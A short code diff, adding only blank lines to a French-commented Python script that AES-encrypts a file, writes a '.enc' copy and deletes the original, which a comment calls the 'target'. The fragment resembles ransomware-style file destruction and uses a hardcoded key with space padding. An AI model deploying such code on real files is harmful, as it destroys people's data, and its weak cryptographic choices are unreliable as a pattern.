@@ -2,9 +2,11 @@ import os
 from Crypto.Cipher import AES
 from message import *
 
+
 # Fonction pour remplir les datas à 16 octets
 def pad(data):
     return data + b' ' * (16 - len(data) % 16)
+
 
 # Fonction de chiffrement
 def encrypt_file(file_path, key):
@@ -16,6 +18,7 @@ def encrypt_file(file_path, key):
     with open(file_path + '.enc', 'wb') as f:
         f.write(encrypted_data)
     os.remove(file_path)  # Supprime le fichier original => cible
+
 
 # Clé de 16
 key = b'SixteenByteKey!l'
